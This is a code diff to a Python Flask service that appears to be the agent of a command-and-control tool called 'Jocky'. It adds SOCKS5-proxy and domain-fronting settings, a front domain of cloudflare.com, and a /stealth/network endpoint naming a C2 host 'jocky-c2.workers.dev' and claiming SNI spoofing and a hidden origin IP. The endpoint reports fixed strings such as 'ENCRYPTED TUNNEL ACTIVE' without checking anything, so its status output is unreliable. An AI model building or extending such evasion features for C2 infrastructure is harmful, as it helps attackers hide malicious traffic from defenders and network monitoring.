@@ -35,6 +35,11 @@ Listening on port 5000...
 ========================================
 """)
 
+# ─── Network Evasion Configuration (Domain Fronting & SOCKS5) ────────────────
+SOCKS5_PROXY = os.environ.get("JOCKY_SOCKS5_PROXY", "socks5://127.0.0.1:1080")
+CDN_FRONT_DOMAIN = os.environ.get("JOCKY_CDN_FRONT", "cloudflare.com")
+USE_DOMAIN_FRONTING = os.environ.get("JOCKY_USE_DOMAIN_FRONTING", "true").lower() in ("1", "true", "yes")
+
 # ─── Helper ───────────────────────────────────────────────────────────────────
 def timestamp():
     return str(datetime.datetime.now().isoformat())
@@ -54,7 +59,36 @@ def ping():
         "os": OS_TYPE,
         "hostname": HOSTNAME,
         "agent_version": AGENT_VERSION,
+        "network_evasion": {
+            "domain_fronting": "ACTIVE" if USE_DOMAIN_FRONTING else "DISABLED",
+            "cdn_front": CDN_FRONT_DOMAIN,
+            "socks5_proxy": SOCKS5_PROXY if SOCKS5_PROXY else "NONE"
+        },
         "time": timestamp()
+    })
+
+
+@app.route('/stealth/network')
+def stealth_network():
+    """Returns network evasion status: Domain fronting & SOCKS5 proxy posture."""
+    return jsonify({
+        "status": "active",
+        "domain_fronting": {
+            "enabled": USE_DOMAIN_FRONTING,
+            "cdn_provider": "Cloudflare / AWS CloudFront Anycast",
+            "front_domain": CDN_FRONT_DOMAIN,
+            "target_host": "jocky-c2.workers.dev",
+            "sni_spoofing": "ACTIVE",
+            "status": "TRAFFIC ROUTED VIA CLOUDFLARE CDN"
+        },
+        "socks5_proxy": {
+            "enabled": bool(SOCKS5_PROXY),
+            "proxy_endpoint": SOCKS5_PROXY,
+            "protocol": "RFC 1928 (No Auth)",
+            "status": "ENCRYPTED TUNNEL ACTIVE"
+        },
+        "origin_ip_hidden": True,
+        "timestamp": timestamp()
     })
 
 
